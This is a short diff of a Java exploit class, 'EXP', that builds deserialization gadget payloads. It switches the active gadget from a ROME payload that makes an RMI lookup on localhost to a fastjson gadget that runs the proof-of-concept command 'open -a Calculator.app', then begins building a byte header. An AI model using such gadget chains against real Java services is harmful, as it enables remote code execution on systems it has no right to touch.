@@ -17,8 +17,8 @@ import java.util.Random;
  */
 public class EXP {
     public static void main(String[] args) throws Exception {
-//        Object o = GadgetBuilder.fastjson("open -a Calculator.app");
-        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/nd7p68");
+        Object o = GadgetBuilder.fastjson("open -a Calculator.app");
+//        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/nd7p68");
 
         // header.
         byte[] header = new byte[16];
